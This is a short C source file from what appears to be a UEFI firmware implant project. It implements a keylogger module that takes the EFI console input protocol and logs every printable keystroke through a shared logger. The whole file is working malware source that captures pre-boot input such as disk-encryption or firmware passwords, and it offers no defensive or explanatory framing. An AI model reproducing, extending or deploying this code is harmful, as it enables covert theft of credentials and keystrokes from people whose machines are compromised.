#include "Keylogger.h"
#include "../Shared/Logger.h"

static EFI_SIMPLE_TEXT_INPUT_PROTOCOL* TextIn = NULL;

BOOLEAN InitializeKeylogger(void) {
    EFI_STATUS Status;
    EFI_SYSTEM_TABLE* SystemTable = GetSystemTable();  // this is saved in Utils.c

    if (!SystemTable) {
        LogWarning(L"Keylogger without access to st\n");
        return FALSE;
    }

    TextIn = SystemTable->ConIn;
    if (!TextIn || !TextIn->ReadKeyStroke) {
        LogWarning(L"entry protocol not found\n");
        return FALSE;
    }

    LogInfo(L"Keylogger started\n");
    return TRUE;
}

VOID PollKeystrokes(void) {
    if (!TextIn) return;

    EFI_INPUT_KEY Key;
    EFI_STATUS Status = TextIn->ReadKeyStroke(TextIn, &Key);

    if (EFI_ERROR(Status)) return;

    if (Key.UnicodeChar >= 32 && Key.UnicodeChar <= 126) {
        WCHAR Buffer[2] = { Key.UnicodeChar, L'\0' };
        LogInfo(Buffer);  
    }
}
